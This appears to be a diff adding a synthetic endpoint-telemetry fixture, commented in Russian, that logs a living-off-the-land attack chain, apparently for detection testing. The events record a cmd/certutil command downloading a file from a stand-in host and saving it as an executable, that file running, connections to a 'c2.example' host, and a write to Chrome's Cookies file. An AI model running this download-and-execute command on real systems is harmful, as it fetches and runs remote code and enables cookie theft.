@@ -1,0 +1,16 @@
+# lolbin_download: штатная системная утилита тянет из сети файл, который
+# тут же запускается. Ни одна программа в цепочке не является вредоносной
+# сама по себе — вредоносна связка.
+ts=1730200000000 type=process_start pid=3310 ppid=880 image=C:\Windows\System32\cmd.exe cmdline="cmd /c certutil -urlcache -split -f http://cdn.example.net/upd.txt %TEMP%\upd.exe" user=DESKTOP\max
+ts=1730200000500 type=process_start pid=3315 ppid=3310 image=C:\Windows\System32\certutil.exe cmdline="certutil -urlcache -split -f http://cdn.example.net/upd.txt C:\Users\max\AppData\Local\Temp\upd.exe"
+ts=1730200000900 type=net_connect pid=3315 raddr=91.204.11.7 rport=80 domain=cdn.example.net
+ts=1730200001500 type=file_create pid=3315 path=C:\Users\max\AppData\Local\Temp\upd.exe
+ts=1730200001900 type=file_write pid=3315 path=C:\Users\max\AppData\Local\Temp\upd.exe size=126976
+ts=1730200002200 type=process_end pid=3315 exit=0
+ts=1730200002600 type=process_start pid=3340 ppid=3310 image=C:\Users\max\AppData\Local\Temp\upd.exe cmdline="upd.exe --install"
+ts=1730200003100 type=net_connect pid=3340 raddr=45.9.7.11 rport=443 domain=c2.example
+ts=1730200003600 type=file_create pid=3340 path=C:\Users\max\AppData\Roaming\Upd\state.bin
+ts=1730200003900 type=file_write pid=3340 path=C:\Users\max\AppData\Roaming\Upd\state.bin size=8192
+ts=1730200004300 type=process_end pid=3310 exit=0
+ts=1730200005000 type=net_connect pid=3340 raddr=45.9.7.11 rport=8443 domain=c2.example
+ts=1730200005800 type=file_write pid=1300 path="C:\Users\max\AppData\Local\Google\Chrome\User Data\Default\Cookies" size=131072
